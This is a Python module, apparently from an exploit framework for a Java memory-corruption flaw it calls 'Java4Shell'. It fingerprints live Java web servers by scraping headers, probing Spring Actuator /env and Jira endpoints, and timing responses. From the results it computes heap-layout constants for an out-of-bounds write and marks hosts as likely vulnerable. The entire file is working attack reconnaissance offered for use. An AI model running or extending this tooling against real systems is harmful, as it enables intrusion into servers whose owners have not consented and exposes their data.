# language: Python 3.10+, file: modules/fingerprint.py
# Target and JDK fingerprinting for Java4Shell (CVE-2026-114938).
# Determines: app type, JDK major version, GC in use, AVX-512 presence likelihood.

import re
import time
import urllib.request
import urllib.error
import ssl
import statistics
from dataclasses import dataclass, field
from typing import Optional

from modules.targets import PROFILES, TargetProfile, detect_profile
from modules.http_utils import random_ua


# ─── Result dataclass ──────────────────────────────────────────────────────────

@dataclass
class FingerprintResult:
    target_url: str
    reachable: bool = False
    app_name: Optional[str] = None
    profile_key: Optional[str] = None
    profile: Optional[TargetProfile] = None

    # JDK version intel
    jdk_version: Optional[str] = None      # e.g. "17.0.9", "21.0.3"
    jdk_major: Optional[int] = None        # 17, 21, 25, 27 …
    jdk_vendor: Optional[str] = None       # "OpenJDK", "Oracle", "Temurin", …

    # JVM configuration
    gc_type: Optional[str] = None          # "G1GC", "ZGC", "Shenandoah", "ParallelGC"
    compressed_oops: bool = True           # almost always True for heap < 32 GB
    compact_headers: bool = False          # True for JDK 25+ default or explicit flag
    avx512_likely: bool = False            # inferred — not directly observable

    # Heap layout constants (derived from jdk_major + gc_type)
    region_size_bytes: int = 0             # G1=1-32MB, ZGC=2MB, Shenan=256KB-32MB
    obj_header_size: int = 16             # bytes: mark(8)+klass(4)+length(4) for array
    oob_write_bytes: int = 63             # ~63 bytes written past end of buffer

    # Raw response data
    server_header: str = ""
    powered_by: str = ""
    response_body_snippet: str = ""
    response_headers: dict = field(default_factory=dict)
    baseline_ms: float = 0.0

    # Timing samples for GC inference
    timing_samples: list[float] = field(default_factory=list)

    # Whether the attacker's /proc/cpuinfo exposes avx512vbmi.
    # Meaningful when Docker target is on the same physical host.
    # None = not checked / unavailable.
    avx512_host_present: Optional[bool] = None

    errors: list[str] = field(default_factory=list)
    notes_extra: str = ""   # extra deployment metadata (e.g. Jira deployment type)


# ─── JDK version patterns ──────────────────────────────────────────────────────

_JDK_PATTERNS = [
    # OpenJDK version strings in headers or error pages
    (r"OpenJDK[/ ](\d+)\.(\d+)\.(\d+)",          "OpenJDK"),
    (r"Java[/ ](\d+)\.(\d+)\.(\d+)",              "Java"),
    (r"JDK[/ ]?(\d+)\.(\d+)\.(\d+)",              "JDK"),
    (r"java\.runtime\.version=(\d+)\.(\d+)\.(\d+)", "JRE"),
    # Spring Boot actuator /info or /actuator/info
    (r'"java\.version"\s*:\s*"(\d+)\.(\d+)\.(\d+)"', "Spring-Actuator"),
    # Jetty / Tomcat version exposures
    (r"Apache Tomcat/\S+ \(Java (\d+)\.(\d+)\.(\d+)\)", "Tomcat"),
    (r"Jetty\([^)]*Java/(\d+)\.(\d+)\.(\d+)\)",          "Jetty"),
    # Generic "version X.Y.Z" near java keyword
    (r"[Jj]ava[^0-9]{0,20}(\d{2})\.(\d+)\.(\d+)",       "Generic"),
    # JDK 17+ "feature release" style: just major
    (r"[Jj]ava[/ ](\d{2})\b",                             "MajorOnly"),
]

_GC_PATTERNS = {
    "G1GC":        [r"G1", r"g1gc", r"G1GarbageCollector", r"Garbage-First"],
    "ZGC":         [r"ZGC", r"Z Garbage Collector", r"zgc"],
    "Shenandoah":  [r"Shenandoah", r"shenandoah"],
    "ParallelGC":  [r"Parallel", r"ParallelGC", r"ParNew"],
}

_VENDOR_PATTERNS = {
    "OpenJDK":  r"OpenJDK|openjdk",
    "Oracle":   r"Oracle|oracle",
    "Temurin":  r"Temurin|Eclipse|adoptium|AdoptOpenJDK",
    "Corretto": r"Corretto|corretto|Amazon",
    "Zulu":     r"Zulu|zulu|Azul",
    "GraalVM":  r"GraalVM|graalvm",
    "Liberica": r"Liberica|liberica|BellSoft",
}


def _ssl_ctx() -> ssl.SSLContext:
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    return ctx


def _get(url: str, timeout: float, extra_headers: dict = None) -> tuple[int, dict, str]:
    """Returns (status_code, headers_dict, body_str)."""
    headers = {"User-Agent": random_ua()}
    if extra_headers:
        headers.update(extra_headers)
    req = urllib.request.Request(url, headers=headers)
    try:
        with urllib.request.urlopen(req, timeout=timeout, context=_ssl_ctx()) as r:
            body = r.read(4096).decode(errors="replace")
            return r.status, dict(r.headers), body
    except urllib.error.HTTPError as e:
        body = ""
        try:
            body = e.read(4096).decode(errors="replace")
        except Exception:
            pass
        return e.code, dict(e.headers), body
    except Exception as e:
        return 0, {}, str(e)


def _parse_jdk_version(text: str) -> tuple[Optional[str], Optional[int], Optional[str]]:
    """Returns (version_string, major_int, vendor_string)."""
    for pattern, label in _JDK_PATTERNS:
        m = re.search(pattern, text, re.IGNORECASE)
        if m:
            groups = m.groups()
            if len(groups) >= 3:
                ver = f"{groups[0]}.{groups[1]}.{groups[2]}"
                major = int(groups[0])
            else:
                ver = groups[0]
                major = int(groups[0])
            # Vendor
            vendor = "Unknown"
            for v_name, v_pat in _VENDOR_PATTERNS.items():
                if re.search(v_pat, text):
                    vendor = v_name
                    break
            return ver, major, vendor
    return None, None, None


def _parse_gc(text: str) -> Optional[str]:
    for gc, patterns in _GC_PATTERNS.items():
        for pat in patterns:
            if re.search(pat, text, re.IGNORECASE):
                return gc
    return None


def _derive_heap_constants(result: FingerprintResult):
    """Fill in GC region size and object header layout from detected versions."""
    major = result.jdk_major or 17
    gc = result.gc_type or "G1GC"

    # Object header sizes (compressed oops enabled — default for heap < 32GB):
    # JDK 17/21: mark(8) + klass_compressed(4) + array_length(4) = 16 bytes
    # JDK 25+: compact headers ON by default: mark+klass fits in 8 bytes, length(4) = 12 bytes
    if major >= 25:
        result.compact_headers = True
        result.obj_header_size = 12   # 8 (mark+klass packed) + 4 (length)
    else:
        result.compact_headers = False
        result.obj_header_size = 16   # 8 (mark) + 4 (klass) + 4 (length)

    # GC region sizes
    if gc == "G1GC":
        result.region_size_bytes = 1 * 1024 * 1024    # default 1MB (can be 1-32MB)
    elif gc == "ZGC":
        result.region_size_bytes = 2 * 1024 * 1024    # 2MB small pages
    elif gc == "Shenandoah":
        result.region_size_bytes = 256 * 1024          # 256KB typical
    else:
        result.region_size_bytes = 1 * 1024 * 1024

    # AVX-512 VBMI: infer from deployment context.
    # avx512_host_present is set by fingerprint() from /proc/cpuinfo (same physical host
    # as a local Docker target). If None, we fall back to version-based likelihood.
    if result.avx512_host_present is True:
        result.avx512_likely = True
    elif result.avx512_host_present is False:
        result.avx512_likely = False   # confirmed absent — intrinsic path will NOT fire
    elif major in (17, 21, 25, 27) or (major and major >= 17):
        result.avx512_likely = True    # unknown CPU — assume affected JDK = likely


# ─── Timing-based GC inference ────────────────────────────────────────────────

def _infer_gc_from_timing(samples: list[float]) -> Optional[str]:
    """
    GC pause signature heuristics:
    - G1GC:        occasional 50-150ms pauses in young gen
    - ZGC:         very consistent, sub-5ms pauses
    - Shenandoah:  similar to ZGC but slightly higher variance
    - ParallelGC:  large, infrequent pauses (200ms+)
    """
    if len(samples) < 5:
        return None

    median = statistics.median(samples)
    stdev  = statistics.stdev(samples) if len(samples) > 1 else 0
    maxval = max(samples)
    cv     = stdev / median if median > 0 else 0  # coefficient of variation

    if maxval > 200:
        return "ParallelGC"
    if cv < 0.15 and median < 20:
        return "ZGC"
    if cv < 0.30 and median < 40:
        return "Shenandoah"
    return "G1GC"


# ─── Fingerprint specific endpoints ───────────────────────────────────────────

def _probe_spring_actuator(base_url: str, timeout: float, result: FingerprintResult):
    for path in ["/actuator/info", "/actuator/env", "/info"]:
        url = base_url.rstrip("/") + path
        code, headers, body = _get(url, timeout)
        if code == 200 and body:
            result.response_body_snippet += body[:500]
            ver, major, vendor = _parse_jdk_version(body)
            if ver and not result.jdk_version:
                result.jdk_version = ver
                result.jdk_major = major
                result.jdk_vendor = vendor
            gc = _parse_gc(body)
            if gc and not result.gc_type:
                result.gc_type = gc
            break


def _probe_jira(base_url: str, timeout: float, result: FingerprintResult):
    for path in ["/rest/api/2/serverInfo", "/rest/api/latest/serverInfo"]:
        code, _, body = _get(base_url.rstrip("/") + path, timeout)
        if code == 200 and "version" in body.lower():
            result.response_body_snippet += body[:500]
            # Jira exposes {"version":"X.Y.Z",...}
            m = re.search(r'"deploymentType"\s*:\s*"([^"]+)"', body)
            if m:
                result.notes_extra = m.group(1)
            break


# ─── Main fingerprint function ─────────────────────────────────────────────────

def fingerprint(target_url: str, timeout: float = 10.0,
                profile_hint: Optional[str] = None) -> FingerprintResult:
    """
    Full fingerprint of target. Returns a FingerprintResult with all intel gathered.
    """
    result = FingerprintResult(target_url=target_url)
    base = target_url.rstrip("/")

    # ── 1. Basic reachability + header harvest ─────────────────────────────
    t0 = time.perf_counter()
    code, headers, body = _get(base, timeout)
    result.baseline_ms = (time.perf_counter() - t0) * 1000

    if code == 0:
        result.errors.append(f"Unreachable: {body}")
        return result

    result.reachable = True
    result.server_header  = headers.get("Server", headers.get("server", ""))
    result.powered_by     = headers.get("X-Powered-By", headers.get("x-powered-by", ""))
    result.response_headers = headers
    result.response_body_snippet = body[:800]

    combined_text = " ".join([
        result.server_header, result.powered_by, body,
        str(headers)
    ])

    # ── 2. JDK version from headers/body ───────────────────────────────────
    ver, major, vendor = _parse_jdk_version(combined_text)
    if ver:
        result.jdk_version = ver
        result.jdk_major   = major
        result.jdk_vendor  = vendor

    # ── 3. GC type from headers/body ───────────────────────────────────────
    result.gc_type = _parse_gc(combined_text)

    # ── 4. Profile detection ───────────────────────────────────────────────
    if profile_hint and profile_hint in PROFILES:
        result.profile_key = profile_hint
        result.profile     = PROFILES[profile_hint]
        result.app_name    = result.profile.name
    else:
        profile = detect_profile(body, headers)
        if profile:
            result.profile = profile
            result.app_name = profile.name
            # reverse-lookup key
            for k, v in PROFILES.items():
                if v is profile:
                    result.profile_key = k
                    break

    # ── 5. App-specific probes ─────────────────────────────────────────────
    _probe_spring_actuator(base, timeout, result)

    if result.profile_key in ("jira", "confluence"):
        _probe_jira(base, timeout, result)

    # ── 6. Timing samples for GC inference ─────────────────────────────────
    samples = [result.baseline_ms]
    for _ in range(6):
        t0 = time.perf_counter()
        _get(base, timeout)
        samples.append((time.perf_counter() - t0) * 1000)
    result.timing_samples = samples

    if not result.gc_type:
        result.gc_type = _infer_gc_from_timing(samples)

    # ── 7. Derive heap constants ────────────────────────────────────────────
    _derive_heap_constants(result)

    # ── 8. Local CPU probe (meaningful when target is local/Docker) ─────────
    try:
        with open("/proc/cpuinfo", "r") as _f:
            _cpu = _f.read()
        result.avx512_host_present = "avx512vbmi" in _cpu
        # Re-derive now that we have concrete CPU info
        _derive_heap_constants(result)
        if not result.avx512_host_present:
            result.errors.append(
                "AVX-512 VBMI absent on host CPU — JVM intrinsic path will NOT activate. "
                "Scalar fallback trigger enabled automatically."
            )
    except Exception:
        result.avx512_host_present = None   # non-Linux or no access

    # ── 9. Fallback defaults ─────────────────────────────────────────────────
    if not result.jdk_major:
        # Assume JDK 21 (most common modern unpatched deployment at time of CVE)
        result.jdk_major  = 21
        result.jdk_vendor = "Unknown"
        result.errors.append("JDK version not detected — assuming JDK 21 (adjust with --jdk-version)")

    if not result.gc_type:
        result.gc_type = "G1GC"
        result.errors.append("GC not detected — assuming G1GC (adjust with --gc)")

    if not result.profile:
        # Generic Spring fallback
        result.profile     = PROFILES["spring"]
        result.profile_key = "spring"
        result.app_name    = "Unknown (generic Spring profile)"
        result.errors.append("App not fingerprinted — using generic Spring Boot profile")

    return result


def print_fingerprint(r: FingerprintResult):
    BOLD = "\033[1m"
    RST  = "\033[0m"
    GRN  = "\033[92m"
    YLW  = "\033[93m"
    RED  = "\033[91m"
    CYN  = "\033[96m"

    print(f"\n{BOLD}  ── Fingerprint: {r.target_url} ──{RST}")
    reach = f"{GRN}YES{RST}" if r.reachable else f"{RED}NO{RST}"
    print(f"  Reachable     : {reach}   Baseline: {r.baseline_ms:.1f}ms")
    print(f"  App           : {CYN}{r.app_name or 'Unknown'}{RST}")
    print(f"  Profile       : {r.profile_key or 'none'}")
    print(f"  Server header : {r.server_header or '—'}")

    ver_str = r.jdk_version or f"JDK {r.jdk_major} (major only)"
    detected = "(detected)" if r.jdk_version else "(assumed)"
    print(f"  JDK version   : {YLW}{ver_str}{RST} {detected}  vendor={r.jdk_vendor or '?'}")
    print(f"  GC type       : {r.gc_type or '?'}   region={r.region_size_bytes//1024}KB")
    print(f"  CompressedOops: {r.compressed_oops}   CompactHeaders: {r.compact_headers}")
    print(f"  ObjHeaderSize : {r.obj_header_size}B   OOB write: ~{r.oob_write_bytes}B")

    avx_target = f"{RED}LIKELY VULNERABLE{RST}" if r.avx512_likely else f"{GRN}likely safe (no AVX-512){RST}"
    avx_host   = ""
    if r.avx512_host_present is True:
        avx_host = f"  {YLW}(host CPU: avx512vbmi PRESENT — intrinsic path active){RST}"
    elif r.avx512_host_present is False:
        avx_host = f"  {RED}(host CPU: avx512vbmi ABSENT — scalar fallback trigger){RST}"
    print(f"  AVX-512 VBMI  : {avx_target}{avx_host}")

    if r.errors:
        for e in r.errors:
            print(f"  {YLW}[warn]{RST} {e}")
    print()
